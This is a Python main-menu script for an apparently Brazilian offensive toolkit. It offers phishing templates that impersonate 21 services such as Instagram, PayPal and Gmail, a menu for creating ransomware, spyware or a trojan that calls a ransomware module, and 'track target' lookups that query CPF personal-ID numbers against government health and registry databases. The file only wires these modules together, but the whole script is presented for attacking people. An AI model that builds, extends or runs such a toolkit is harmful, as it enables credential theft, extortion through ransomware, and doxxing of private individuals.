# bibliotecas
from colorama import Fore
import shutil
import time
import requests
import random
import platform
import keyboard
import webbrowser
from core import doxxing, goldenphish, ser, scanner, ui, rastrear
from malware import ransomware, spyware
from cryptography.fernet import Fernet
import shutil
import json
import sys

def main():
    resposta = int(input('O que deseja?\n⤷ '))

    # Geolocalizar IP
    if resposta == 1:
        ui.clear()
        ui.logo()
        ui.title("Geolocalizar IP")

        try:
            rastrear.Ip()
        except Exception as  ex:
            print(f"{Fore.RED}Error: ({ex})")

    # Phishing
    elif resposta == 2:
        ui.clear()
        ui.logo()
        ui.title("Phishing - Templates\n")

        print("[1] Instagram          [2] Facebook            [3] Snapchat")
        print("[4] Twitter            [5] GitHub              [6] Gmail")
        print("[7] Spotify            [8] Netflix             [9] PayPal")
        print("[10] Microsoft         [11] Steam              [12] Yahoo")
        print("[13] LinkedIn          [14] Protonmail         [15] Wordpress")
        print("[16] Pinterest         [17] Twitch             [18] Discord")
        print("[19] Disney +          [20] Star +             [21] Hbo max")

        templates = {
            '1':'instagram',
            '2': 'facebook',
            '3': 'snapchat',
            '4': 'twitter',
            '5': 'github',
            '6': 'Gmail',
            '7': 'spotify',
            '8': 'netflix',
            '9': 'paypal',
            '10': 'Microsoft',
            '11': 'steam',
            '12': 'yahoo',
            '13': 'linkedin',
            '14': 'protonmail',
            '15': 'wordpress',
            '16': 'Pinterest',
            '17': 'Twitch',
            '18': 'Discord',
            '19': 'Disney +',
            '20': 'Star +',
            '21': 'Hbo max',
            }

        ui.question()
    
    # Malware
    elif resposta == 3:
        ui.clear()
        ui.logo()
        ui.title("Malware\n")

        print(f"""
    {Fore.GREEN}[1]{Fore.WHITE} Ransomware
    {Fore.GREEN}[2]{Fore.WHITE} Spyware
    {Fore.GREEN}[3]{Fore.WHITE} Trojan
    {Fore.RED}[0] Sair{Fore.WHITE}""")
        
        resposta = int(input("Selecione o vírus que deseja criar:\n⤷ "))

        if resposta == 1:
            ransomware.ransomware()

    # Rastrear
    elif resposta == 5:
        ui.clear()
        ui.logo()
        ui.title("Rastrear Alvo\n")

        while True:
            ui.clear()
            ui.logo()
            print(f"""
    {Fore.GREEN}[1]{Fore.WHITE} CEP
    {Fore.GREEN}[2]{Fore.WHITE} CPF
    {Fore.RED}[0] Voltar{Fore.WHITE}""")
            response = int(input(f'{Fore.WHITE}Insira a pesquisa que você deseja:\n⤷  '))

            if response == 1:
                ui.clear()
                ui.logo()
                ui.title("Rastrear Alvo")

                cep = input(f'{Fore.WHITE}Insira o CEP:\n⤷  ')
                if cep == 0:
                    break
                
                rastrear.cep(cep)

            elif response == 2:
                ui.clear()
                ui.logo()
                ui.title("Rastrear Alvo")
                
                cpf = input(f'{Fore.WHITE}Insira o CPF:\n⤷  ')

                print(f"""
    {Fore.GREEN}[1]{Fore.WHITE} CADSUS
    {Fore.GREEN}[2]{Fore.WHITE} SIREGI
    {Fore.RED}[0] Voltar{Fore.WHITE}""")
                
                base = int(input(f'{Fore.WHITE}\nSelecione a base:\n⤷  '))
                if base == 0:
                    break

                result = rastrear.cpf(cpf, base)
                
                if result:
                    print(result)
                else:
                    print(f"{Fore.RED}Nenhuma informação encontrada ou erro na consulta.")
                
                ui.question()
                
            elif response == 0:
                break
            else:
                print("Opção inválida. Tente novamente.")
        
        ui.clear()
        return
        
    else:
        sys.exit()

Sair = False
if __name__ == '__main__':
    ui.clear()
    
    while(Sair == False):
        ui.logo()
        ui.menu()
        main()